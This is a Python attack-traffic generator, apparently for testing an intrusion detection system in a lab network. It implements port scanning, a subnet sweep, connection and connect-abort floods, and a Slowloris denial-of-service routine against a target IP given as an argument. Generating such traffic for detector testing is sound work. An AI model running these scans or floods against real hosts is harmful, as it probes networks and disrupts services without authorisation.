#!/usr/bin/env python3
"""
attacker.py — Simple Attack Generator (Port Scanning & Connection Flooding)
Generates controlled TCP test traffic to trigger the intrusion detection system.
"""

import socket
import time
import sys

TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.3"
MODE = sys.argv[1] if len(sys.argv) > 1 else "scan"  # 'scan' or 'flood'


def port_scan():
    """Scans multiple destination ports on the victim (Vertical Port Scan)."""
    ports = [21, 22, 23, 25, 80, 110, 443, 8080, 9000]
    print(f"[*] Starting Vertical Port Scan against {TARGET_IP} on ports {ports}...")

    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        res = s.connect_ex((TARGET_IP, port))
        if res == 0:
            print(f"  [+] Port {port:<5} OPEN")
        else:
            print(f"  [-] Port {port:<5} CLOSED or FILTERED / BLOCKED (code: {res})")
        s.close()
        time.sleep(0.1)


def connection_flood():
    """Rapidly floods connections to port 8080 (Volumetric DoS)."""
    print(f"[*] Starting Connection Flood against {TARGET_IP}:8080 (30 rapid connections)...")

    for i in range(30):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, 8080))
            s.sendall(b"FLOOD_TEST\n")
            print(f"  [+] Connection #{i+1:02d} established")
            s.close()
        except Exception as e:
            print(f"  [X] Connection #{i+1:02d} BLOCKED / DROPPED: {e}")
        time.sleep(0.05)


def syn_flood():
    """Simulates rapid TCP connect-abort burst (SYN Flood proxy via SO_LINGER)."""
    print(f"[*] Starting TCP SYN Flood against {TARGET_IP}:8080 (25 rapid half-open/RST bursts)...")

    for i in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # SO_LINGER 0 forces kernel to send RST upon close, simulating abortive SYN-connects
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
            s.settimeout(0.3)
            s.connect((TARGET_IP, 8080))
            print(f"  [+] SYN-Burst #{i+1:02d} injected -> Immediate kernel RST")
            s.close()
        except Exception as e:
            print(f"  [X] SYN-Burst #{i+1:02d} BLOCKED / DROPPED: {e}")
        time.sleep(0.04)


def subnet_sweep():
    """Probes port 8080 across multiple destination IPs (Horizontal Subnet Scan)."""
    target_hosts = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"]
    print(f"[*] Starting Horizontal Subnet Sweep on port 8080 across hosts: {target_hosts}...")

    for host in target_hosts:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        res = s.connect_ex((host, 8080))
        if res == 0:
            print(f"  [+] Host {host:<12} Port 8080 -> RESPONDED")
        else:
            print(f"  [-] Host {host:<12} Port 8080 -> FILTERED / BLOCKED (code: {res})")
        s.close()
        time.sleep(0.1)


def slowloris():
    """Holds sockets open with incomplete HTTP headers (Low-and-Slow Thread Starvation)."""
    print(f"[*] Starting Slowloris attack against {TARGET_IP}:8080 (holding sockets open)...")
    sockets = []
    for i in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((TARGET_IP, 8080))
            s.send(b"GET /data HTTP/1.1\r\nUser-Agent: AegisSlow\r\n")
            sockets.append(s)
            print(f"  [+] Slowloris Socket #{i+1:02d} established (header withheld)")
        except Exception as e:
            print(f"  [X] Slowloris Socket #{i+1:02d} BLOCKED / REFUSED: {e}")
        time.sleep(0.1)

    print("[*] Holding connections open with periodic 1-byte headers...")
    for round_idx in range(3):
        time.sleep(1.0)
        for idx, s in enumerate(list(sockets)):
            try:
                s.send(b"X-a: b\r\n")
                print(f"  [~] Socket #{idx+1:02d} keep-alive byte sent (Round {round_idx+1})")
            except Exception as e:
                print(f"  [!] Socket #{idx+1:02d} DROPPED / CLOSED by network defense: {e}")
                sockets.remove(s)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass


def main():
    if MODE == "scan":
        port_scan()
    elif MODE == "flood":
        connection_flood()
    elif MODE == "syn_flood":
        syn_flood()
    elif MODE == "subnet":
        subnet_sweep()
    elif MODE == "slowloris":
        slowloris()
    else:
        print("Usage: python3 attacker.py [scan|flood|syn_flood|subnet|slowloris] [TARGET_IP]")


if __name__ == "__main__":
    main()
